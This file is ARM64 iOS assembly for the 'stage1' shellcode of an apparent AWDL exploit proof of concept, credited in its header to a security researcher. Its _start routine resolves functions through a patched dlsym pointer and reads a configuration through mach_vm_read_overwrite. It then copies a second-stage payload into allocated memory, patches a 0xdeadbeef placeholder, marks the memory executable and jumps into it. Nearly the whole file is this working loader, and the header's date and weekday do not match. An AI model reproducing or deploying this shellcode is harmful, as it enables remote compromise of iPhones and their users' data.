;xcrun -sdk iphoneos clang -g -O2  -mios-version-min=14.3 -DDEBUG=0  -Wall -Wpedantic -Wno-gnu -Werror -Wunused-variable -o z.out stage1.s
; Hand Rolled by David Hoyt | SRD0009 | @h02332 for Apple Security Research Device on Wednesday June 14, 2021
; EDIT - This is an example.. you should recognize Code :-)
; Your Mileage May Vary
	;
	;
	.section	__TEXT,__text,regular,pure_instructions
	.build_version ios, 15, 0	sdk_version 15, 0
	.file	1 "/Users/xss/Downloads/awdl_exploit_release/shellcode" "poc-stage1.s"
	.file	2 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/_types" "_uint64_t.h"
	.file	3 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/_types" "_uint8_t.h"
	.file	4 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/os" "log.h"
	.file	5 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include" "asl.h"
	.file	6 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach/arm" "kern_return.h"
	.file	7 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/arm" "_types.h"
	.file	8 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys" "_types.h"
	.file	9 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_mach_port_t.h"
	.file	10 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach" "vm_types.h"
	.file	11 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach/arm" "vm_types.h"
	.file	12 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach" "port.h"
	.file	13 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_size_t.h"
	.file	14 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach/arm" "boolean.h"
	.file	15 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach" "vm_prot.h"
	.file	16 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/_types" "_uint32_t.h"
	.globl	_start                          ; -- Begin function start
	.p2align	4
_start:                                 ; @start
Lfunc_begin0:
	.loc	1 106 0                         ; poc-stage1.s:106:0
	.cfi_startproc
; %bb.0:
	stp	x28, x27, [sp, #-32]!           ; 16-byte Folded Spill
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	sub	sp, sp, #976                    ; =976
	.cfi_def_cfa_offset 1008
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w27, -24
	.cfi_offset w28, -32
	str	w0, [sp, #972]
	str	x1, [sp, #960]
	str	x2, [sp, #952]
Ltmp0:
	.loc	1 0 0 prologue_end              ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
	str	x8, [sp, #64]                   ; 8-byte Folded Spill
	.loc	1 107 5                         ; poc-stage1.s:107:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	str	x0, [sp, #72]                   ; 8-byte Folded Spill
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str@PAGE
	add	x1, x1, l_.str@PAGEOFF
	str	x1, [sp, #40]                   ; 8-byte Folded Spill
	.loc	1 107 5                         ; poc-stage1.s:107:5
	blr	x8
	mov	x8, x0
	mov	x1, #0
	str	x1, [sp, #48]                   ; 8-byte Folded Spill
	mov	x0, x1
	mov	w2, #3
	str	w2, [sp, #60]                   ; 4-byte Folded Spill
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, l_.str.1@PAGE
	add	x3, x3, l_.str.1@PAGEOFF
	.loc	1 107 5                         ; poc-stage1.s:107:5
	blr	x8
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 112 5 is_stmt 1               ; poc-stage1.s:112:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.2@PAGE
	add	x1, x1, l_.str.2@PAGEOFF
	.loc	1 112 5                         ; poc-stage1.s:112:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #972]
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x9, _kdata@PAGE
	.loc	1 112 5                         ; poc-stage1.s:112:5
	ldr	x1, [x9, _kdata@PAGEOFF]
	add	x3, sp, #136                    ; =136
	mov	x2, #816
	add	x4, sp, #128                    ; =128
	blr	x8
	ldr	x1, [sp, #40]                   ; 8-byte Folded Reload
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 114 5 is_stmt 1               ; poc-stage1.s:114:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	blr	x8
	ldr	x1, [sp, #48]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #60]                   ; 4-byte Folded Reload
	mov	x8, x0
	mov	x0, x1
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x3, l_.str.3@PAGE
	add	x3, x3, l_.str.3@PAGEOFF
	.loc	1 114 5                         ; poc-stage1.s:114:5
	blr	x8
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 117 30 is_stmt 1              ; poc-stage1.s:117:30
	ldr	w9, [sp, #148]
	.loc	1 117 46 is_stmt 0              ; poc-stage1.s:117:46
	lsl	w9, w9, #10
	.loc	1 117 14                        ; poc-stage1.s:117:14
	str	w9, [sp, #124]
	.loc	1 120 16 is_stmt 1              ; poc-stage1.s:120:16
	ldr	w9, [sp, #124]
	mov	w10, #16383
	add	w9, w9, w10
	str	w9, [sp, #124]
	.loc	1 121 16                        ; poc-stage1.s:121:16
	ldr	w9, [sp, #124]
	and	w9, w9, #0xffffc000
	str	w9, [sp, #124]
	.loc	1 125 24                        ; poc-stage1.s:125:24
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.4@PAGE
	add	x1, x1, l_.str.4@PAGEOFF
	.loc	1 125 24                        ; poc-stage1.s:125:24
	blr	x8
	blr	x0
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	mov	x9, x0
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 125 17                        ; poc-stage1.s:125:17
	str	w9, [sp, #108]
	.loc	1 126 5 is_stmt 1               ; poc-stage1.s:126:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.5@PAGE
	add	x1, x1, l_.str.5@PAGEOFF
	.loc	1 126 5                         ; poc-stage1.s:126:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #108]
	ldr	w9, [sp, #124]
	mov	x2, x9
	add	x1, sp, #112                    ; =112
	mov	w3, #1
	blr	x8
Ltmp1:
	.loc	1 129 19 is_stmt 1              ; poc-stage1.s:129:19
	str	wzr, [sp, #104]
LBB0_1:                                 ; =>This Inner Loop Header: Depth=1
Ltmp2:
	.loc	1 129 26 is_stmt 0              ; poc-stage1.s:129:26
	ldr	w8, [sp, #104]
	.loc	1 129 33                        ; poc-stage1.s:129:33
	ldr	w9, [sp, #148]
Ltmp3:
	.loc	1 129 5                         ; poc-stage1.s:129:5
	subs	w8, w8, w9
	b.hs	LBB0_4
Ltmp4:
; %bb.2:                                ;   in Loop: Header=BB0_1 Depth=1
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
Ltmp5:
	.loc	1 130 9 is_stmt 1               ; poc-stage1.s:130:9
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
Ltmp6:
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.2@PAGE
	add	x1, x1, l_.str.2@PAGEOFF
Ltmp7:
	.loc	1 130 9                         ; poc-stage1.s:130:9
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #972]
	add	x9, sp, #136                    ; =136
	add	x9, x9, #16                     ; =16
	ldr	w10, [sp, #104]
                                        ; kill: def $x10 killed $w10
	ldr	x1, [x9, x10, lsl #3]
	ldr	x9, [sp, #112]
	ldr	w10, [sp, #104]
	lsl	w10, w10, #10
                                        ; kill: def $x10 killed $w10
	add	x3, x9, x10
	mov	x2, #1024
	add	x4, sp, #128                    ; =128
	blr	x8
Ltmp8:
; %bb.3:                                ;   in Loop: Header=BB0_1 Depth=1
	.loc	1 129 52 is_stmt 1              ; poc-stage1.s:129:52
	ldr	w8, [sp, #104]
	add	w8, w8, #1                      ; =1
	str	w8, [sp, #104]
	.loc	1 129 5 is_stmt 0               ; poc-stage1.s:129:5
	b	LBB0_1
Ltmp9:
LBB0_4:
	.loc	1 0 5                           ; poc-stage1.s:0:5
	add	x8, sp, #96                     ; =96
	str	x8, [sp, #16]                   ; 8-byte Folded Spill
	mov	x8, #48879
	movk	x8, #57005, lsl #16
	movk	x8, #48879, lsl #32
	movk	x8, #57005, lsl #48
	.loc	1 134 14 is_stmt 1              ; poc-stage1.s:134:14
	str	x8, [sp, #96]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
	str	x8, [sp, #24]                   ; 8-byte Folded Spill
	.loc	1 135 44 is_stmt 1              ; poc-stage1.s:135:44
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	str	x0, [sp, #32]                   ; 8-byte Folded Spill
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.6@PAGE
	add	x1, x1, l_.str.6@PAGEOFF
	.loc	1 135 44                        ; poc-stage1.s:135:44
	blr	x8
	ldr	x2, [sp, #16]                   ; 8-byte Folded Reload
	mov	x8, x0
	ldr	x0, [sp, #112]
	ldr	w9, [sp, #124]
	mov	x1, x9
	mov	x3, #8
	blr	x8
	ldr	x8, [sp, #24]                   ; 8-byte Folded Reload
	mov	x9, x0
	ldr	x0, [sp, #32]                   ; 8-byte Folded Reload
	.loc	1 135 24                        ; poc-stage1.s:135:24
	str	x9, [sp, #88]
	.loc	1 136 5 is_stmt 1               ; poc-stage1.s:136:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str@PAGE
	add	x1, x1, l_.str@PAGEOFF
	.loc	1 136 5                         ; poc-stage1.s:136:5
	blr	x8
	mov	x8, x0
	ldr	x9, [sp, #88]
	mov	x1, #0
	mov	x0, x1
	mov	w2, #3
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, l_.str.7@PAGE
	add	x3, x3, l_.str.7@PAGEOFF
	.loc	1 136 5                         ; poc-stage1.s:136:5
	mov	x10, sp
	str	x9, [x10]
	blr	x8
	ldr	x8, [sp, #24]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #32]                   ; 8-byte Folded Reload
	.loc	1 137 26 is_stmt 1              ; poc-stage1.s:137:26
	ldr	x9, [x8, __dlsym@PAGEOFF]
	.loc	1 137 6 is_stmt 0               ; poc-stage1.s:137:6
	ldr	x10, [sp, #88]
	.loc	1 137 24                        ; poc-stage1.s:137:24
	str	x9, [x10]
	.loc	1 140 5 is_stmt 1               ; poc-stage1.s:140:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.8@PAGE
	add	x1, x1, l_.str.8@PAGEOFF
	.loc	1 140 5                         ; poc-stage1.s:140:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #108]
	ldr	x1, [sp, #112]
	ldr	w9, [sp, #124]
	mov	x2, x9
	mov	w3, #0
	mov	w4, #5
	blr	x8
	.loc	1 143 42 is_stmt 1              ; poc-stage1.s:143:42
	ldr	x8, [sp, #112]
	.loc	1 143 12 is_stmt 0              ; poc-stage1.s:143:12
	str	x8, [sp, #80]
	.loc	1 144 5 is_stmt 1               ; poc-stage1.s:144:5
	ldr	x8, [sp, #80]
	.loc	1 144 12 is_stmt 0              ; poc-stage1.s:144:12
	ldr	w0, [sp, #972]
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x9, _kdata@PAGE
	.loc	1 144 18                        ; poc-stage1.s:144:18
	ldr	x1, [x9, _kdata@PAGEOFF]
	.loc	1 144 5                         ; poc-stage1.s:144:5
	blr	x8
	.loc	1 145 1 is_stmt 1               ; poc-stage1.s:145:1
	add	sp, sp, #976                    ; =976
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	ldp	x28, x27, [sp], #32             ; 16-byte Folded Reload
	ret
Ltmp10:
Lfunc_end0:
	.cfi_endproc
                                        ; -- End function
	.globl	_main                           ; -- Begin function main
	.p2align	2
_main:                                  ; @main
Lfunc_begin1:
	.loc	1 150 0                         ; poc-stage1.s:150:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #304                    ; =304
	stp	x28, x27, [sp, #272]            ; 16-byte Folded Spill
	stp	x29, x30, [sp, #288]            ; 16-byte Folded Spill
	.cfi_def_cfa_offset 304
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w27, -24
	.cfi_offset w28, -32
Ltmp11:
	.loc	1 0 0 prologue_end              ; poc-stage1.s:0:0
	adrp	x8, __os_log_default@GOTPAGE
	ldr	x8, [x8, __os_log_default@GOTPAGEOFF]
	str	x8, [sp, #112]                  ; 8-byte Folded Spill
Ltmp12:
	adrp	x9, ___dso_handle@GOTPAGE
	ldr	x9, [x9, ___dso_handle@GOTPAGEOFF]
	str	x9, [sp, #120]                  ; 8-byte Folded Spill
	adrp	x9, ___stack_chk_guard@GOTPAGE
	ldr	x9, [x9, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x9, [x9]
	str	x9, [sp, #264]
	str	wzr, [sp, #236]
	str	w0, [sp, #232]
	str	x1, [sp, #224]
Ltmp13:
	.loc	1 153 10                        ; poc-stage1.s:153:10
	str	x8, [sp, #208]
	strb	wzr, [sp, #207]
Ltmp14:
	.loc	1 153 10 is_stmt 0              ; poc-stage1.s:153:10
	ldr	x0, [sp, #208]
	ldrb	w1, [sp, #207]
	bl	_os_log_type_enabled
Ltmp15:
	.loc	1 153 10                        ; poc-stage1.s:153:10
	tbz	w0, #0, LBB1_2
; %bb.1:
Ltmp16:
	.loc	1 153 10                        ; poc-stage1.s:153:10
	ldr	x8, [sp, #208]
	str	x8, [sp, #88]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #207]
	str	w8, [sp, #100]                  ; 4-byte Folded Spill
	add	x0, sp, #192                    ; =192
	str	x0, [sp, #104]                  ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #88]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #100]                  ; 4-byte Folded Reload
	ldr	x4, [sp, #104]                  ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG0@PAGE
	add	x3, x3, LOS_LOG0@PAGEOFF
	mov	w5, #2
	.loc	1 153 10                        ; poc-stage1.s:153:10
	bl	__os_log_impl
Ltmp17:
LBB1_2:
	.loc	1 0 10                          ; poc-stage1.s:0:10
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
Ltmp18:
	.loc	1 154 10 is_stmt 1              ; poc-stage1.s:154:10
	str	x8, [sp, #184]
	mov	w8, #1
	strb	w8, [sp, #183]
Ltmp19:
	.loc	1 154 10 is_stmt 0              ; poc-stage1.s:154:10
	ldr	x0, [sp, #184]
	ldrb	w1, [sp, #183]
	bl	_os_log_type_enabled
Ltmp20:
	.loc	1 154 10                        ; poc-stage1.s:154:10
	tbz	w0, #0, LBB1_4
; %bb.3:
Ltmp21:
	.loc	1 154 10                        ; poc-stage1.s:154:10
	ldr	x8, [sp, #184]
	str	x8, [sp, #64]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #183]
	str	w8, [sp, #76]                   ; 4-byte Folded Spill
	add	x0, sp, #176                    ; =176
	str	x0, [sp, #80]                   ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #64]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #76]                   ; 4-byte Folded Reload
	ldr	x4, [sp, #80]                   ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG1@PAGE
	add	x3, x3, LOS_LOG1@PAGEOFF
	mov	w5, #2
	.loc	1 154 10                        ; poc-stage1.s:154:10
	bl	__os_log_impl
Ltmp22:
LBB1_4:
	.loc	1 0 10                          ; poc-stage1.s:0:10
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
Ltmp23:
	.loc	1 155 10 is_stmt 1              ; poc-stage1.s:155:10
	str	x8, [sp, #168]
	mov	w8, #2
	strb	w8, [sp, #167]
Ltmp24:
	.loc	1 155 10 is_stmt 0              ; poc-stage1.s:155:10
	ldr	x0, [sp, #168]
	ldrb	w1, [sp, #167]
	bl	_os_log_type_enabled
Ltmp25:
	.loc	1 155 10                        ; poc-stage1.s:155:10
	tbz	w0, #0, LBB1_6
; %bb.5:
Ltmp26:
	.loc	1 155 10                        ; poc-stage1.s:155:10
	ldr	x8, [sp, #168]
	str	x8, [sp, #40]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #167]
	str	w8, [sp, #52]                   ; 4-byte Folded Spill
	add	x0, sp, #160                    ; =160
	str	x0, [sp, #56]                   ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #40]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #52]                   ; 4-byte Folded Reload
	ldr	x4, [sp, #56]                   ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG2@PAGE
	add	x3, x3, LOS_LOG2@PAGEOFF
	mov	w5, #2
	.loc	1 155 10                        ; poc-stage1.s:155:10
	bl	__os_log_debug_impl
Ltmp27:
LBB1_6:
	.loc	1 157 40 is_stmt 1              ; poc-stage1.s:157:40
	ldr	w0, [sp, #220]
	.loc	1 157 31 is_stmt 0              ; poc-stage1.s:157:31
	bl	_getpwuid
	.loc	1 157 25                        ; poc-stage1.s:157:25
	str	x0, [sp, #152]
Ltmp28:
	.loc	1 158 14 is_stmt 1              ; poc-stage1.s:158:14
	ldr	x8, [sp, #152]
Ltmp29:
	.loc	1 158 14 is_stmt 0              ; poc-stage1.s:158:14
	cbnz	x8, LBB1_10
; %bb.7:
Ltmp30:
	.loc	1 160 24 is_stmt 1              ; poc-stage1.s:160:24
	bl	___error
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
	ldr	w9, [x0]
	.loc	1 160 18 is_stmt 0              ; poc-stage1.s:160:18
	str	w9, [sp, #148]
Ltmp31:
	.loc	1 161 14 is_stmt 1              ; poc-stage1.s:161:14
	str	x8, [sp, #136]
	mov	w8, #16
	strb	w8, [sp, #135]
Ltmp32:
	.loc	1 161 14 is_stmt 0              ; poc-stage1.s:161:14
	ldr	x0, [sp, #136]
	ldrb	w1, [sp, #135]
	bl	_os_log_type_enabled
Ltmp33:
	.loc	1 161 14                        ; poc-stage1.s:161:14
	tbz	w0, #0, LBB1_9
; %bb.8:
Ltmp34:
	.loc	1 161 14                        ; poc-stage1.s:161:14
	ldr	x8, [sp, #136]
	str	x8, [sp, #16]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #135]
	str	w8, [sp, #28]                   ; 4-byte Folded Spill
	ldr	w1, [sp, #220]
	ldr	w2, [sp, #148]
	add	x0, sp, #240                    ; =240
	str	x0, [sp, #32]                   ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_2_4_0_4_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #16]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #28]                   ; 4-byte Folded Reload
	ldr	x4, [sp, #32]                   ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG3@PAGE
	add	x3, x3, LOS_LOG3@PAGEOFF
	mov	w5, #14
	.loc	1 161 14                        ; poc-stage1.s:161:14
	bl	__os_log_error_impl
Ltmp35:
LBB1_9:
	.loc	1 163 21 is_stmt 1              ; poc-stage1.s:163:21
	ldr	w8, [sp, #148]
	.loc	1 163 14 is_stmt 0              ; poc-stage1.s:163:14
	str	w8, [sp, #236]
	b	LBB1_11
Ltmp36:
LBB1_10:
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
	.loc	1 166 5 is_stmt 1               ; poc-stage1.s:166:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.9@PAGE
	add	x1, x1, l_.str.9@PAGEOFF
	.loc	1 166 5                         ; poc-stage1.s:166:5
	blr	x8
	mov	x8, x0
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x0, l_.str.10@PAGE
	add	x0, x0, l_.str.10@PAGEOFF
	.loc	1 166 5                         ; poc-stage1.s:166:5
	blr	x8
	mov	w0, #0
	mov	x2, #0
	.loc	1 167 5 is_stmt 1               ; poc-stage1.s:167:5
	mov	x1, x2
	bl	_start
	mov	w8, #42
	.loc	1 168 5                         ; poc-stage1.s:168:5
	str	w8, [sp, #236]
Ltmp37:
LBB1_11:
	.loc	1 170 6                         ; poc-stage1.s:170:6
	ldr	w8, [sp, #236]
	str	w8, [sp, #12]                   ; 4-byte Folded Spill
	adrp	x8, ___stack_chk_guard@GOTPAGE
	ldr	x8, [x8, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x8, [x8]
	ldr	x9, [sp, #264]
	subs	x8, x8, x9
	b.ne	LBB1_13
; %bb.12:
	.loc	1 0 6 is_stmt 0                 ; poc-stage1.s:0:6
	ldr	w0, [sp, #12]                   ; 4-byte Folded Reload
	.loc	1 170 6                         ; poc-stage1.s:170:6
	ldp	x29, x30, [sp, #288]            ; 16-byte Folded Reload
	ldp	x28, x27, [sp, #272]            ; 16-byte Folded Reload
	add	sp, sp, #304                    ; =304
	ret
LBB1_13:
	.loc	1 0 0                           ; poc-stage1.s:0:0
	bl	___stack_chk_fail
Ltmp38:
Lfunc_end1:
	.cfi_endproc
                                        ; -- End function
	.private_extern	___os_log_helper_16_0_0 ; -- Begin function __os_log_helper_16_0_0
	.globl	___os_log_helper_16_0_0
	.weak_definition	___os_log_helper_16_0_0
	.p2align	2
___os_log_helper_16_0_0:                ; @__os_log_helper_16_0_0
Lfunc_begin2:
	.loc	1 0 0 is_stmt 1                 ; poc-stage1.s:0:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16                     ; =16
	.cfi_def_cfa_offset 16
	str	x0, [sp, #8]
Ltmp40:
	ldr	x8, [sp, #8]
	strb	wzr, [x8]
	strb	wzr, [x8, #1]
	add	sp, sp, #16                     ; =16
	ret
Ltmp41:
Lfunc_end2:
	.cfi_endproc
                                        ; -- End function
	.private_extern	___os_log_helper_16_0_2_4_0_4_0 ; -- Begin function __os_log_helper_16_0_2_4_0_4_0
	.globl	___os_log_helper_16_0_2_4_0_4_0
	.weak_definition	___os_log_helper_16_0_2_4_0_4_0
	.p2align	2
___os_log_helper_16_0_2_4_0_4_0:        ; @__os_log_helper_16_0_2_4_0_4_0
Lfunc_begin3:
	.loc	1 0 0                           ; poc-stage1.s:0:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16                     ; =16
	.cfi_def_cfa_offset 16
	str	x0, [sp, #8]
	str	w1, [sp, #4]
	str	w2, [sp]
Ltmp43:
	ldr	x9, [sp, #8]
	strb	wzr, [x9]
	mov	w8, #2
	strb	w8, [x9, #1]
	strb	wzr, [x9, #2]
	mov	w8, #4
	strb	w8, [x9, #3]
	ldr	w10, [sp, #4]
	str	w10, [x9, #4]
	strb	wzr, [x9, #8]
	strb	w8, [x9, #9]
	ldr	w8, [sp]
	stur	w8, [x9, #10]
	add	sp, sp, #16                     ; =16
	ret
Ltmp44:
Lfunc_end3:
	.cfi_endproc
                                        ; -- End function
	.globl	__dlsym                         ; @_dlsym
	.p2align	3
__dlsym:
	.quad	-2401053088876216593

	.globl	_kdata                          ; @kdata
	.p2align	3
_kdata:
	.quad	4774451407313060418             ; 0x4242424242424242

	.section	__TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
	.asciz	"asl_log"

l_.str.1:                               ; @.str.1
	.asciz	"hello from stage1!"

l_.str.2:                               ; @.str.2
	.asciz	"mach_vm_read_overwrite"

l_.str.3:                               ; @.str.3
	.asciz	"stage1 read kconf"

l_.str.4:                               ; @.str.4
	.asciz	"task_self_trap"

l_.str.5:                               ; @.str.5
	.asciz	"mach_vm_allocate"

l_.str.6:                               ; @.str.6
	.asciz	"memmem"

l_.str.7:                               ; @.str.7
	.asciz	"stage2_dlsym_addr: %016llx"

l_.str.8:                               ; @.str.8
	.asciz	"mach_vm_protect"

	.section	__TEXT,__oslogstring,cstring_literals
LOS_LOG0:                               ; @"\01LOS_LOG0"
	.asciz	"Standard log message."

LOS_LOG1:                               ; @"\01LOS_LOG1"
	.asciz	"Additional info for troubleshooting."

LOS_LOG2:                               ; @"\01LOS_LOG2"
	.asciz	"Debug level messages."

LOS_LOG3:                               ; @"\01LOS_LOG3"
	.asciz	"failed to lookup user %d: %{darwin.errno}d"

	.section	__TEXT,__cstring,cstring_literals
l_.str.9:                               ; @.str.9
	.asciz	"printf"

l_.str.10:                              ; @.str.10
	.asciz	"%s %d hello - start\n"

	.file	17 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_uid_t.h"
	.file	18 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include" "pwd.h"
	.file	19 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_gid_t.h"